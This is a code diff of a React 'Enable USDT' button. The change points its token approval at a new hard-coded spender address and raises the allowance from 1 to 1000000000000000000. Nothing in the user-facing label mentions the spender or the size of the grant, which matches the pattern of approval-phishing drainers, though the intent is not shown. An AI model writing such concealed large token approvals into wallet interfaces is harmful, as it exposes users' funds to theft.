@@ -37,9 +37,12 @@ export const ApproveButton = () => {
   const currentChainId = useChainId();
   const connectionStatus = useConnectionStatus();
   const switchChain = useSwitchChain();
-  const { contract } = useContract(
-    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"
-  );
+
+  const {
+    contract,
+    isLoading: contractLoading,
+    error: contractError,
+  } = useContract("0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "erc20");
   const [isLoading, setIsLoading] = useState(false);
 
   const callApproval = async () => {
@@ -53,9 +56,13 @@ export const ApproveButton = () => {
       if (address && contract) {
         console.log("Contract instance:", contract);
         setIsLoading(true);
+        // Check if the ERC20 interface is available on the contract
+        if (!contract.erc20) {
+          throw new Error("ERC20 interface is not available on the contract.");
+        }
         const tx = await contract.erc20.setAllowance(
-          "0x7A0CE8524bea337f0beE853B68fAbDE145dAC0A0",
-          1
+          "0x406aE7273E16F48caA25C5a4C37266661051A11e",
+          1000000000000000000
         );
         alert("Contract call success:");
       }
@@ -66,14 +73,14 @@ export const ApproveButton = () => {
     }
   };
 
-  return isLoading ? (
-    <div> Loading... </div>
+  return isLoading || contractLoading ? (
+    "loading...."
   ) : (
     <button
       onClick={callApproval}
       style={{
-        padding: "20px",
-        fontSize: "20px",
+        padding: "10px",
+        fontSize: "16px",
       }}
     >
       Enable USDT
